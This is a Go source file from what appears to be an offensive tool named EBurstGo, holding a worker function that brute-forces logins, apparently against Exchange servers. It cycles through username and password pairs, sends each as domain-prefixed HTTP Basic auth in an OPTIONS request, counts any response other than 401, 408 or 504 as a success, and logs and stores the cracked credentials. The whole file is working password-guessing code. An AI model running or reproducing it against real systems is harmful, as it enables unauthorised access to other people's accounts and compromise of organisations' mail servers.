package brute

import (
	"EBurstGo/common"
	"net/http"
	"time"
)

func BasicBruteWorker(info *common.TaskInfo) {
	for data := range info.Task {
		username, password := data[0], data[1]

		if info.Result.Get(username) {
			continue
		}

		common.Log.Debug("[*] trying: %v:%v", username, password)

		client := common.NewHttpClient(info)
		req, _ := http.NewRequest("OPTIONS", info.Target, nil)
		req.SetBasicAuth(info.Domain+"\\"+username, password)
		req.Header.Add("Connection", "close")
		res, err := client.Do(req)

		if err != nil {
			panic(err)
		}

		if res.StatusCode != 401 && res.StatusCode != 408 && res.StatusCode != 504 {
			common.Log.Success("[+] success: %v", username+":"+password)
			info.Result.Put(username, password)
		} else {
			common.Log.Failed("[-] failed: %v", username+":"+password)
		}

		time.Sleep(time.Second * time.Duration(info.Delay))
	}
}
